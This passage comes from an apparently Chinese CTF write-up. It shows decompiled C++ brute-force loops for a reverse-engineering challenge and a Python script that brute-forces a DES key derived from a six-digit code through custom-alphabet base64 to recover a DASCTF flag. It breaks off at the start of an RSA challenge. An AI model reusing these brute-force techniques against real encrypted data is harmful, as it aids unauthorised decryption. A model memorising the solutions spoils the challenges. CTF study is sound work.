class="comment">//int v12; // eax</span></span><br><span class="line"><span class="comment">//int v13; // edx</span></span><br><span class="line"><span class="comment">//int v14; // r9d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r10d</span></span><br><span class="line"><span class="comment">//unsigned int v17; // edx</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// len = strlen(code);</span></span><br><span class="line"><span class="comment">//for (int q = 0; q &lt;= 30; q++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//len = q;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v4 = -7;</span></span><br><span class="line"><span class="comment">//v5 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = v5;</span></span><br><span class="line"><span class="comment">//v7 = v4 &amp; v5;</span></span><br><span class="line"><span class="comment">//v8 = v4;</span></span><br><span class="line"><span class="comment">//v4 ^= v6;</span></span><br><span class="line"><span class="comment">//v5 = 2 * v7;</span></span><br><span class="line"><span class="comment">//&#125; while (v5);</span></span><br><span class="line"><span class="comment">//if (v6 != v8)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v9 = len;</span></span><br><span class="line"><span class="comment">//len ^= v4;</span></span><br><span class="line"><span class="comment">//v4 = 2 * (v4 &amp; v9);</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">///*code[6] = 0;</span></span><br><span class="line"><span class="comment">//p_code = code;*/</span></span><br><span class="line"><span class="comment">//v3 = len == 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result &quot; &lt;&lt; v3 &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>验证码是6位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_password() &#123;</span></span><br><span class="line"><span class="comment">//std::string chars = &quot;0123456789&quot;;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool v3;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; chars.size(); ++i) &#123;</span></span><br><span class="line"><span class="comment">//for (int j = 0; j &lt; chars.size(); ++j) &#123;</span></span><br><span class="line"><span class="comment">//for (int k = 0; k &lt; chars.size(); ++k) &#123;</span></span><br><span class="line"><span class="comment">//for (int l = 0; l &lt; chars.size(); ++l) &#123;</span></span><br><span class="line"><span class="comment">//for (int m = 0; m &lt; chars.size(); ++m) &#123;</span></span><br><span class="line"><span class="comment">//for (int n = 0; n &lt; chars.size(); ++n) &#123;</span></span><br><span class="line"><span class="comment">//std::string password = &#123; chars[i], chars[j], chars[k], chars[l], chars[m], chars[n] &#125;;</span></span><br><span class="line"><span class="comment">//const char* p_code = password.c_str();</span></span><br><span class="line"><span class="comment">//v3 = true;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//int this_code = *p_code;</span></span><br><span class="line"><span class="comment">//v12 = -49;</span></span><br><span class="line"><span class="comment">//v13 = 1;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v14 = v13;</span></span><br><span class="line"><span class="comment">//v15 = v12 &amp; v13;</span></span><br><span class="line"><span class="comment">//v16 = v12;</span></span><br><span class="line"><span class="comment">//v12 ^= v14;</span></span><br><span class="line"><span class="comment">//v13 = 2 * v15;</span></span><br><span class="line"><span class="comment">//&#125; while (v13);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v14 != v16) &#123;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v17 = this_code;</span></span><br><span class="line"><span class="comment">//this_code ^= v12;</span></span><br><span class="line"><span class="comment">//v12 = 2 * (v12 &amp; v17);</span></span><br><span class="line"><span class="comment">//&#125; while (v12);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (this_code &gt;= 0xA) &#123;</span></span><br><span class="line"><span class="comment">//v3 = false;</span></span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//++p_code;</span></span><br><span class="line"><span class="comment">//&#125; while (*p_code);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v3) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;Found a password: &quot; &lt;&lt; password &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_password();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>验证码是数字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main(void) &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//int v3; // edx</span></span><br><span class="line"><span class="comment">//int v4; // r8d</span></span><br><span class="line"><span class="comment">//int v5; // r9d</span></span><br><span class="line"><span class="comment">//int v6; // r8d</span></span><br><span class="line"><span class="comment">//int v7; // r10d</span></span><br><span class="line"><span class="comment">//int v8; // r8d</span></span><br><span class="line"><span class="comment">//unsigned int ans; // r11d</span></span><br><span class="line"><span class="comment">//__int64 v10; // r10</span></span><br><span class="line"><span class="comment">//int v11; // ecx</span></span><br><span class="line"><span class="comment">//int v12; // edx</span></span><br><span class="line"><span class="comment">//int v13; // eax</span></span><br><span class="line"><span class="comment">//int v14; // r8d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r9d</span></span><br><span class="line"><span class="comment">//int v17; // edx</span></span><br><span class="line"><span class="comment">//char v19[42]; // [rsp+2Eh] [rbp-2Ah] BYREF</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int p = 1; p &lt;= 100; p++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//len = p;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v3 = -41;</span></span><br><span class="line"><span class="comment">//v4 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v5 = v4;</span></span><br><span class="line"><span class="comment">//v6 = v3 &amp; v4;</span></span><br><span class="line"><span class="comment">//v7 = v3;</span></span><br><span class="line"><span class="comment">//v3 ^= v5;</span></span><br><span class="line"><span class="comment">//v4 = 2 * v6;</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//if (v5 != v7)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v8 = len;</span></span><br><span class="line"><span class="comment">//len ^= v3;</span></span><br><span class="line"><span class="comment">//v3 = 2 * (v3 &amp; v8);</span></span><br><span class="line"><span class="comment">//&#125; while (v3);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//ans = 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result: &quot; &lt;&lt; len &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;cstring&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//__int64 check(__int64 a1) &#123;</span></span><br><span class="line"><span class="comment">//// Your function here</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_flag() &#123;</span></span><br><span class="line"><span class="comment">//std::string flag(40, &#x27;0&#x27;);  // Initialize a flag string of length 40 with &#x27;0&#x27;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool ans;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Set the specific positions to &quot;DASCTF&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment">//std::string initial = &quot;DASCTF&#123;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; ++i) &#123;</span></span><br><span class="line"><span class="comment">//flag[i] = initial[i];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Check the flag</span></span><br><span class="line"><span class="comment">//if (check((__int64)flag.c_str())) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; satisfies the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; does not satisfy the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_flag();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag的长度40和开头结尾要求</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* p_lastflag; <span class="comment">// r8</span></span><br><span class="line"><span class="type">char</span>* p_str2; <span class="comment">// rcx</span></span><br><span class="line"><span class="type">char</span>* end; <span class="comment">// r9</span></span><br><span class="line"><span class="type">char</span> v6; <span class="comment">// si</span></span><br><span class="line"><span class="type">unsigned</span> __int8 left; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v14; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v15; <span class="comment">// r12d</span></span><br><span class="line"><span class="type">int</span> v16; <span class="comment">// edi</span></span><br><span class="line"><span class="type">char</span> v17; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v21; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v22; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v23; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v24; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v25; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v26; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line"><span class="type">char</span>* saved_flag; <span class="comment">// [rsp+20h] [rbp-D8h] BYREF</span></span><br><span class="line">__int64 slen; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line"><span class="type">char</span> afterbase[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C0h] BYREF</span></span><br><span class="line"><span class="type">char</span> Str2[<span class="number">184</span>]; <span class="comment">// [rsp+40h] [rbp-B8h] BYREF</span></span><br><span class="line">slen = <span class="number">1</span>;</span><br><span class="line">p_lastflag = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">*p_lastflag = k;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)slen &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">end = Str2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p_str2 = Str2;</span><br><span class="line">end = &amp;Str2[<span class="number">2</span> * (<span class="type">int</span>)slen];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v6 = *p_lastflag;</span><br><span class="line">left = (<span class="type">unsigned</span> __int8)*p_lastflag &gt;&gt; <span class="number">4</span>;</span><br><span class="line">v8 = left;</span><br><span class="line"><span class="keyword">if</span> (left &lt;= <span class="number">9u</span>)</span><br><span class="line">&#123;</span><br><span class="line">v9 = left ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!left)</span><br><span class="line">v9 = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v9 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v10 = v9 &amp; v8;</span><br><span class="line">v9 ^= v8;</span><br><span class="line">v8 = <span class="number">2</span> * v10;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v10);</span><br><span class="line">v11 = <span class="number">-11</span>;</span><br><span class="line">v12 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v13 = v12;</span><br><span class="line">v14 = v11 &amp; v12;</span><br><span class="line">v15 = v11;</span><br><span class="line">v11 ^= v13;</span><br><span class="line">v12 = <span class="number">2</span> * v14;</span><br><span class="line">&#125; <span class="keyword">while</span> (v12);</span><br><span class="line"><span class="keyword">if</span> (v13 != v15)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v16 = v9 &amp; v11;</span><br><span class="line">v9 ^= v11;</span><br><span class="line">v11 = <span class="number">2</span> * v16;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v16);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">*p_str2 = v9;</span><br><span class="line">p_str2 += <span class="number">2</span>;</span><br><span class="line">v17 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line">v18 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line"><span class="keyword">if</span> ((v6 &amp; <span class="number">0xF</span>u) &gt; <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">v19 = <span class="number">65</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v21 = v19 &amp; v18;</span><br><span class="line">v19 ^= v18;</span><br><span class="line">v18 = <span class="number">2</span> * v21;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v21);</span><br><span class="line">v22 = <span class="number">-11</span>;</span><br><span class="line">v23 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v24 = v23;</span><br><span class="line">v25 = v22 &amp; v23;</span><br><span class="line">v26 = v22;</span><br><span class="line">v22 ^= v24;</span><br><span class="line">v23 = <span class="number">2</span> * v25;</span><br><span class="line">&#125; <span class="keyword">while</span> (v23);</span><br><span class="line"><span class="keyword">if</span> (v24 != v26)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v27 = v19;</span><br><span class="line">v19 ^= v22;</span><br><span class="line">v22 = <span class="number">2</span> * (v22 &amp; v27);</span><br><span class="line">&#125; <span class="keyword">while</span> (v22);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v19 = v17 ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!v17)</span><br><span class="line">v19 = <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(p_str2 - <span class="number">1</span>) = v19;</span><br><span class="line">++p_lastflag;</span><br><span class="line">&#125; <span class="keyword">while</span> (p_str2 != end);</span><br><span class="line">&#125;</span><br><span class="line">*end = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; k &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; Str2[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; , &quot;</span> &lt;&lt; Str2[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的逻辑是一位值转换为2位的hex字符串</p><p>然后base64那部分算是一眼叮，然后后面那个des没见过全靠signsrch直接分析出来，然后直接解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">raw_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">new_table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=&#x27;</span></span><br><span class="line">dictionary_decode = <span class="built_in">str</span>.maketrans(new_table, raw_table)</span><br><span class="line">dictionary_encode = <span class="built_in">dict</span>(<span class="built_in">zip</span>(dictionary_decode.values(),dictionary_decode.keys()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 DES 加密结果</span></span><br><span class="line">encrypted_text = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试所有可能的 6 位数字组合</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">10</span>), repeat=<span class="number">6</span>):</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, i))  </span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    keyt = base64.b64encode(key.encode()).decode() <span class="comment"># MTIzMTIzMTIz base64encode(v) 正常的123123进行base64以后的值</span></span><br><span class="line">    keytt = keyt.translate(dictionary_encode)</span><br><span class="line">    key = keytt.encode()</span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    <span class="comment"># 创建 DES 对象</span></span><br><span class="line">    des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    <span class="comment"># 尝试解密</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> decrypted_text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;找到了！密钥是：&#x27;</span>, key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;明文是：&#x27;</span>, decrypted_text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 如果解密失败，就尝试下一个密钥</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><p>先从简单的练起吧。</p><h2 id="bigRSA"><a href="#bigRSA" class="headerlink" title="bigRSA"></a>bigRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span 